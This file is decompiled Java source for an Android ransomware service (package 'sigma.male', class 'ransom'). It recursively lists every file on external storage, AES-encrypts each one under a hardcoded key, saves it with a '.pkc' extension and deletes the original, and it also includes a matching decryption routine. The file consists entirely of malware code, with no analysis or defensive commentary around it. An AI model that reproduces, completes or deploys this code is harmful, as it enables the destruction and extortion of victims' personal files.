/*
 * Decompiled with CFR 0.0.
 * 
 * Could not load the following classes:
 *  android.app.Service
 *  android.content.Intent
 *  android.os.Environment
 *  android.os.IBinder
 *  java.io.File
 *  java.io.FileInputStream
 *  java.io.FileOutputStream
 *  java.io.IOException
 *  java.lang.CharSequence
 *  java.lang.Exception
 *  java.lang.Object
 *  java.lang.String
 *  java.lang.System
 *  java.lang.Throwable
 *  java.util.ArrayList
 *  java.util.Collection
 *  java.util.Iterator
 *  java.util.List
 */
package sigma.male;

import android.app.Service;
import android.content.Intent;
import android.os.Environment;
import android.os.IBinder;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Iterator;
import java.util.List;
import sigma.male.Aes;

public class ransom
extends Service {
    byte[] KEY;
    List<File> al;

    public void decryptFile() throws Exception {
        Iterator iterator = this.al.iterator();
        while (iterator.hasNext()) {
            File file = (File)iterator.next();
            if (file.getPath().contains((CharSequence)".thumbnails") || file.getPath().contains((CharSequence)"brld")) {
                file.delete();
                continue;
            }
            if (!file.getPath().contains((CharSequence)".pkc") || file.getPath().contains((CharSequence)".pkc.pkc") || file.getPath().contains((CharSequence)"brld")) continue;
            if (file.length() / 1024L > 10000L) {
                Aes.decryptLarge(this.KEY, file, new File(file.getPath().substring(0, -4 + file.getPath().length())));
                continue;
            }
            byte[] arrby = this.fullyReadFileToBytes(file);
            this.saveFile(Aes.decrypt(this.KEY, arrby), file.getPath().substring(0, -4 + file.getPath().length()));
            file.delete();
        }
        return;
    }

    public void encryptFile() throws Exception {
        Iterator iterator = this.al.iterator();
        while (iterator.hasNext()) {
            File file = (File)iterator.next();
            if (file.getPath().contains((CharSequence)".thumbnails")) {
                file.delete();
                continue;
            }
            if (file.getPath().contains((CharSequence)"IMPORTANT.jpg") || file.getPath().contains((CharSequence)".pkc") || file.getPath().contains((CharSequence)"brld_")) continue;
            if (file.length() / 1024L > 10000L) {
                Aes.encryptLarge(this.KEY, file, new File(String.valueOf((Object)file.getPath()) + ".pkc"));
                continue;
            }
            this.saveFile(Aes.encrypt(this.KEY, this.fullyReadFileToBytes(file)), String.valueOf((Object)file.getPath()) + ".pkc");
            file.delete();
        }
        return;
    }

    /*
     * Unable to fully structure code
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     * Lifted jumps to return sites
     */
    byte[] fullyReadFileToBytes(File var1_1) throws IOException {
        var2_2 = (int)var1_1.length();
        var3_3 = new byte[var2_2];
        var4_4 = new byte[var2_2];
        var5_5 = new FileInputStream(var1_1);
        try {
            var8_6 = var5_5.read(var3_3, 0, var2_2);
            if (var8_6 >= var2_2) ** GOTO lbl11
        }
        catch (IOException var7_9) {
            try {
                throw var7_9;
            }
            catch (Throwable var6_10) {
                var5_5.close();
                throw var6_10;
            }
        }
        var9_7 = var2_2 - var8_6;
        do {
            block8 : {
                if (var9_7 > 0) break block8;
lbl11: // 2 sources:
                var5_5.close();
                return var3_3;
            }
            var10_8 = var5_5.read(var4_4, 0, var9_7);
            System.arraycopy((Object)var4_4, (int)0, (Object)var3_3, (int)(var2_2 - var9_7), (int)var10_8);
            var9_7 -= var10_8;
            continue;
            break;
        } while (true);
    }

    /*
     * Enabled aggressive block sorting
     */
    List<File> getFiles(File file, String[] arrstring, String[] arrstring2) {
        ArrayList arrayList = new ArrayList();
        File[] arrfile = file.listFiles();
        int n = arrfile.length;
        int n2 = 0;
        while (n2 < n) {
            File file2 = arrfile[n2];
            if (file2.isDirectory()) {
                arrayList.addAll(this.getFiles(file2, arrstring, arrstring2));
            } else {
                arrayList.add((Object)file2);
            }
            ++n2;
        }
        return arrayList;
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void saveFile(byte[] arrby, String string2) {
        try {
            FileOutputStream fileOutputStream = new FileOutputStream(string2);
            fileOutputStream.write(arrby);
            fileOutputStream.close();
            return;
        }
        catch (Exception exception) {
            exception.printStackTrace();
            return;
        }
    }

    public int startrans(String string2) {
        this.al = this.getFiles(Environment.getExternalStorageDirectory(), new String[]{"fuck"}, new String[]{"Android/data"});
        try {
            this.KEY = "th30neand0nly0ne".getBytes("UTF8");
            this.encryptFile();
            return 0;
        }
        catch (Exception exception) {
            exception.printStackTrace();
            return 0;
        }
    }

    public int startrans2(String string2) {
        this.al = this.getFiles(Environment.getExternalStorageDirectory(), new String[]{".pkc"}, new String[]{"Android/data"});
        try {
            this.KEY = "th30neand0nly0ne".getBytes("UTF8");
            this.decryptFile();
            return 0;
        }
        catch (Exception exception) {
            exception.printStackTrace();
            return 0;
        }
    }
}

